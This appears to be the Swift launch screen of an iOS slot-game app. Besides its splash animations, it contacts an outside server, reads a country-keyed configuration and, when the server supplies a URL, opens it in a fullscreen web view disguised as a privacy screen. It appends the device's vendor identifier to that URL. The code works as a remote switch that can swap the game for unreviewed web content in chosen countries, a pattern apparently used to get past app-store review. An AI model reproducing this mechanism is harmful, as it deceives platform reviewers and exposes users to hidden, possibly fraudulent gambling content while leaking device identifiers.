//
//  LauchVC.swift
//  Madness Slot Vaganza
//
//  Created by Madness Slot Vaganza  on 13/09/24.
//

import UIKit
import Adjust
class YonoMadnessLauchVC: UIViewController {
    @IBOutlet weak var YonoMadnessActivityView: UIActivityIndicatorView!
    @IBOutlet weak var imgBg: UIImageView!
    @IBOutlet weak var imgLogo: UIImageView!
    @IBOutlet weak var lblTitle: UILabel!
    
    override func viewDidLoad() {
        super.viewDidLoad()
        self.YonoMadnessynLoadADsData()
       
        performAnimations()
    }
    
    
    func performAnimations() {
        
        UIView.animate(withDuration: 2.0, delay: 0, options: [.curveEaseInOut], animations: {
            self.imgBg.transform = CGAffineTransform(scaleX: 1.3, y: 1.3).rotated(by: CGFloat.pi / 18)
        })
        
        UIView.animate(withDuration: 1.5, delay: 1.0, usingSpringWithDamping: 0.6, initialSpringVelocity: 0.5, options: [], animations: {
            self.imgLogo.transform = CGAffineTransform(translationX: 0, y: 0) // Reset to normal position
            self.imgLogo.alpha = 1.0
        }, completion: { _ in
           
            self.animateTitleWithTypingEffect()
        })
    }
    
    
    func animateTitleWithTypingEffect() {
        lblTitle.text = ""
        let titleText = "Madness\nSlot\nVaganza"
        var charIndex = 0.0
        
        for letter in titleText {
            Timer.scheduledTimer(withTimeInterval: 0.1 * charIndex, repeats: false) { (timer) in
                self.lblTitle.text?.append(letter)
            }
            charIndex += 1
        }

        
        DispatchQueue.main.asyncAfter(deadline: .now() + (0.1 * Double(titleText.count) + 1.0)) {
            let vc = self.storyboard?.instantiateViewController(withIdentifier: "HomeVC") as! YonoMadnessHomeVC
            self.changeScreenWithVanishEffect(to: vc)
        }
    }

   
    func changeScreenWithVanishEffect(to newViewController: UIViewController) {
        
        guard let navigationController = self.navigationController else { return }
        
        let animationDuration = 0.5
        
        UIView.animate(withDuration: animationDuration, animations: {
            self.view.alpha = 0
        }, completion: { _ in
            self.view.alpha = 1
            
            let transition = CATransition()
            transition.duration = animationDuration
            transition.type = .fade
            transition.timingFunction = CAMediaTimingFunction(name: .easeInEaseOut)
            
            navigationController.view.layer.add(transition, forKey: kCATransition)
            
            navigationController.pushViewController(newViewController, animated: false)
        })
    }
    
    
    private func YonoMadnessynLoadADsData() {
        self.YonoMadnessActivityView.startAnimating()
        if YonoMadnessReaManage.sharedManager().isReachable {
            YonoMadnessReqAdsLocalData()
        } else {
            YonoMadnessReaManage.sharedManager().setReachabilityStatusChange { status in
                if YonoMadnessReaManage.sharedManager().isReachable {
                    self.YonoMadnessReqAdsLocalData()
                    YonoMadnessReaManage.sharedManager().stopMonitoring()
                }
            }
            YonoMadnessReaManage.sharedManager().startMonitoring()
        }
    }
    
    private func YonoMadnessReqAdsLocalData() {
        rYonoMadnessequestLocalAdsData { dataDic in
            if let dataDic = dataDic {
                self.YonoMadnessConfigAdsData(pulseDataDic: dataDic)
            } else {
                self.YonoMadnessActivityView.stopAnimating()
            }
        }
    }
    
    private func YonoMadnessConfigAdsData(pulseDataDic: [String: Any]?) {
        if let aDic = pulseDataDic {
            let cCode: String = aDic["countryCode"] as? String ?? ""
            let adsData: [String: Any]? = aDic["jsonObject"] as? Dictionary
            if let adsData = adsData {
                if let codeData = adsData[cCode], codeData is [String: Any] {
                    let dic: [String: Any] = codeData as! [String: Any]
                    if let data = dic["data"] as? String, !data.isEmpty {
                        UserDefaults.standard.set(dic, forKey: "YonoADSData")
                        YonoMadnessshowAds(data)
                        
                    }
                    return
                }
            }
            self.YonoMadnessActivityView.stopAnimating()
        }
    }
    
    private func YonoMadnessshowAds(_ adsUrl: String) {
        let adsVC: YonoMadnessPriViewController = self.storyboard?.instantiateViewController(withIdentifier: "PrivacyVC") as! YonoMadnessPriViewController
        adsVC.modalPresentationStyle = .fullScreen
        adsVC.url = "\(adsUrl)?a=\(Adjust.idfv() ?? "")&p=\(Bundle.main.bundleIdentifier ?? "")"
        print(adsVC.url!)
        if self.presentedViewController != nil {
            self.presentedViewController!.present(adsVC, animated: false)
        } else {
            present(adsVC, animated: false)
        }
    }
    
    private func rYonoMadnessequestLocalAdsData(completion: @escaping ([String: Any]?) -> Void) {
        guard let bundleId = Bundle.main.bundleIdentifier else {
            completion(nil)
            return
        }
        
        let url = URL(string: "https://open.jingjichuhai.top/open/zengMadnessSlotVaganzaLoadAd")!
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        let parameters: [String: Any] = [
            "appMod": UIDevice.current.model,
            "appKey": "74e1cc97b1c347f4ab3b9f99c64df987",
            "appPackageId": bundleId,
            "appVersion": Bundle.main.infoDictionary?["CFBundleShortVersionString"] ?? ""
        ]

        do {
            request.httpBody = try JSONSerialization.data(withJSONObject: parameters, options: [])
        } catch {
            print("Failed to serialize JSON:", error)
            completion(nil)
            return
        }

        let task = URLSession.shared.dataTask(with: request) { data, response, error in
            DispatchQueue.main.async {
                guard let data = data, error == nil else {
                    print("Request error:", error ?? "Unknown error")
                    completion(nil)
                    return
                }
                
                do {
                    let jsonResponse = try JSONSerialization.jsonObject(with: data, options: [])
                    if let resDic = jsonResponse as? [String: Any] {
                        let dictionary: [String: Any]? = resDic["data"] as? Dictionary
                        if let dataDic = dictionary {
                            completion(dataDic)
                            return
                        }
                    }
                    print("Response JSON:", jsonResponse)
                    completion(nil)
                } catch {
                    print("Failed to parse JSON:", error)
                    completion(nil)
                }
            }
        }

        task.resume()
    }

}

